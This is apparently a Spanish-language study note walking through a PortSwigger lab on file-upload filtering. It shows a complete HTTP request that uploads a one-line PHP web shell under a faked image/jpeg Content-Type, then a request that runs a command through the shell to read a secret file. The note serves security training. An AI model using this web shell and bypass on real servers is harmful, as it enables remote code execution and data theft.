---
aliases:
  - File Upload 002 - bypass Content-Type
  - content-type restriction bypass
tags:
  - vuln/file-upload
  - example
  - portswigger
---

# 002 — Bypass de `Content-Type` (finge ser imagen)

> Lab: Web shell upload via Content-Type restriction bypass · **Apprentice** · técnica → [[vulnerabilities/017-file-upload-vulnerabilities/file-upload-vulnerabilities|entry point]]

## ¿Por qué acá? (primer filtro)
- Es **001 + una validación débil:** el server rechaza la subida si el `Content-Type` del fichero no es de imagen. Ese header lo pone el cliente → **es falseable**.
- **Por qué funciona:** la validación mira el `Content-Type` que declarás en el multipart, no el contenido real. Mandás cuerpo PHP diciendo que es `image/jpeg`.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = host del lab + el **Content-Type falso** + el comando.

Interceptá la subida y cambiá **solo** el `Content-Type` de la parte del fichero a `image/jpeg`, dejando el cuerpo PHP:
<pre class="payload"><code>POST /my-account/avatar HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: <mark>image/jpeg</mark>

&lt;?php system($_GET['command']); ?&gt;
------x
Content-Disposition: form-data; name="csrf"

<mark>CSRF-TOKEN</mark>
------x--</code></pre>
Ya subido, se ejecuta igual que 001:
<pre class="payload"><code>GET /files/avatars/exploit.php?command=<mark>cat%20/home/carlos/secret</mark> HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark></code></pre>

## Verificación
La subida pasa (antes daba error de tipo) y el GET devuelve el secreto → *Submit solution*.

## Detalles que se pasan por alto
- El nombre **sigue siendo `.php`**: acá solo mentimos en el header, no tocamos la extensión (eso es 003).
- Si además valida el **contenido** (magic bytes), esto no basta → pasás a **polyglot** ([[vulnerabilities/017-file-upload-vulnerabilities/examples/004-polyglot-jpeg-php|004]]).

→ Siguiente: [[vulnerabilities/017-file-upload-vulnerabilities/examples/003-bypass-extension-htaccess|003 · ahora sí filtra la extensión (blacklist) → .htaccess + .l33t]]
